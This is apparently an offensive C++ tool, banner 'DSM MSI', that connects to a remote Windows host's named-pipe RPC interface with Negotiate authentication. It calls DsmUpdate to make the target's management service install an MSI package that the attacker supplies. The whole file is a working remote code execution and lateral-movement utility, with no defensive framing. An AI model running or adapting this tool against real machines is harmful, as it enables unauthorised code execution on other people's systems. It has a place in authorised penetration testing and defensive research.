#include <windows.h>
#include <stdio.h>
#include <cstdlib>

#include "CsManExt.h"

#pragma comment(lib, "RpcRT4.lib")
#pragma warning( disable: 4996 )


extern "C" void print_banner(const char* tool_name);


int main(int argc, char* argv[])
{
    print_banner("DSM MSI");

    if (argc != 3)
    {
        printf("%s <target> <msi-file>", argv[0]);
        return 1;
    }

    RPC_STATUS status;
    RPC_WSTR StringBinding;
    RPC_BINDING_HANDLE Binding;

    PWSTR target = (PWSTR)malloc(strlen(argv[1]) * sizeof(char) * 2);
    PWSTR msiFile = (PWSTR)malloc(strlen(argv[2]) * sizeof(char) * 2);

    mbstowcs(target, argv[1], strlen(argv[1]) + 1);
    mbstowcs(msiFile, argv[2], strlen(argv[2]) + 1);

    status = RpcStringBindingCompose(
        NULL,
        (RPC_WSTR)L"ncacn_np",
        (RPC_WSTR)target,
        (RPC_WSTR)L"\\pipe\\8107ec4c-4c22-42e9-872e-0bd2d534a4a4",
        NULL,
        &StringBinding
    );

    printf("[*] RpcStringBindingCompose status code: %d\n", status);

    if (status != 0)
    {
        return 1;
    }

    printf("[*] String binding: %ws\n", StringBinding);

    status = RpcBindingFromStringBinding(StringBinding, &Binding);
    printf("[*] RpcBindingFromStringBinding status code: %d\n", status);

    if (status != 0)
    {
        return 1;
    }

    status = RpcStringFree(&StringBinding);
    printf("[*] RpcStringFree status code: %d\n", status);

    if (status != 0)
    {
        return 1;
    }

    status = RpcBindingSetAuthInfoA(Binding, 0, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_AUTHZ_NAME);
    printf("[*] RpcBindingSetAuthInfoA status code: %d\n", status);

    if (status != 0)
    {
        return 1;
    }

    RpcTryExcept
    {
        void* ptr;
        hyper value;

        DsmUpdate(Binding, msiFile, 1, &value);
        printf("[*] Execution finished without an exception.");
    }

    RpcExcept(EXCEPTION_EXECUTE_HANDLER);
    {
        printf("[*] RPCError: %d - 0x%08x\n", RpcExceptionCode(), RpcExceptionCode());
    }

    RpcEndExcept
    {
        status = RpcBindingFree(&Binding);
    }
}
